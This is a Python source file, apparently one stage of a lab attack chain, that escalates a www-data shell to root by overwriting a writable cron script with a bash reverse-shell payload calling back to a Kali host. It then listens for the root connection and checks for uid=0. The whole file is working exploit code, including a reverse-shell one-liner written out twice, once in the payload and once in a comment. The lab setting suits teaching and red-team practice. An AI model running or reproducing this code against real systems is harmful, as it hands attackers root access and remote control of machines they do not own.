import socket
import time

# =============================================================================
# privesc.py — Privilege Escalation via Writable Cron Script
# MITRE ATT&CK: T1053.003 – Cron
# =============================================================================

# Will later be imported from config.py:
#   from config import KALI_HOST, PORT_ROOT, CLEANUP_SCRIPT
KALI_HOST = "10.10.0.2"  # Static IP from compose IPAM; payload uses /dev/tcp/<ip>/<port>
PORT_ROOT = 5555
CLEANUP_SCRIPT = "/opt/cleanup.sh"


def send_command(shell, command):
    """Send a command through an active shell connection."""
    shell.sendall((command + "\n").encode())
    time.sleep(0.5)


def run(www_shell, kali_host=KALI_HOST):
    """
    Run the privilege-escalation step.

    Args:
        www_shell (socket): bash connection as www-data, handed in from the
            previous step.
        kali_host (str):    IP / hostname of the Kali box that the
            reverse-shell payload will dial back to (overrides the module
            default).

    Returns:
        root_shell (socket): bash connection as root, handed off to the
            next step.
    """
    print("\n[*] Starting privilege escalation...")

    # Start the listener BEFORE overwriting cleanup.sh, so the root shell
    # isn't lost when cron fires.
    root_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    root_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    root_server.bind(("0.0.0.0", PORT_ROOT))
    root_server.listen(1)
    print(f"[*] Waiting for root shell on port {PORT_ROOT}...")

    try:
        # Overwrite cleanup.sh with a reverse-shell payload.
        # `>` truncates, `>>` appends.
        print("[*] Overwriting cleanup.sh...")
        send_command(www_shell, f"echo '#!/bin/bash' > {CLEANUP_SCRIPT}")
        send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{kali_host}/{PORT_ROOT} 0>&1' >> {CLEANUP_SCRIPT}")
        print("[+] cleanup.sh overwritten successfully")
        print("[*] Waiting for cron job (max. 60 seconds)...")

        # Cron runs every minute → wait up to 70 seconds.
        root_server.settimeout(70)

        try:
            root_shell, addr = root_server.accept()
            print(f"[+] Root shell received from {addr[0]}")
        except socket.timeout:
            print("[-] Timeout — no root shell received")
            print("    → cron daemon not running: service cron status")
            print("    → cron job missing: cat /etc/cron.d/cleanup")
            print("    → wrong file permissions: ls -la /opt/cleanup.sh")
            return None
    finally:
        root_server.close()

    # Confirm root — read in a loop until "uid=" appears or the timeout
    # elapses (so the initial banner / prompt isn't skipped).
    time.sleep(1)
    send_command(root_shell, "id")
    root_shell.settimeout(5)
    response = ""
    deadline = time.time() + 10
    while time.time() < deadline:
        try:
            chunk = root_shell.recv(1024).decode(errors="replace")
            if chunk:
                response += chunk
                if "uid=" in response:
                    break
        except socket.timeout:
            break

    if "uid=0(root)" in response:
        print("[+] Privilege escalation successful!")
        print(f"[+] {response.strip()}")
    else:
        print("[-] Root not confirmed")
        print(f"[?] Response: {response}")

    return root_shell


# Test mode — not executed when imported by attack.py / main.py.
# To test manually, run inside the apache container as www-data:
#   bash -i >& /dev/tcp/kali/4444 0>&1
if __name__ == "__main__":
    print("[*] Test mode — waiting for www-data shell on port 4444")

    test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    test_server.bind(("0.0.0.0", 4444))
    test_server.listen(1)

    try:
        www_shell, addr = test_server.accept()
        print(f"[+] www-data shell received from {addr[0]}")
    finally:
        test_server.close()

    run(www_shell)
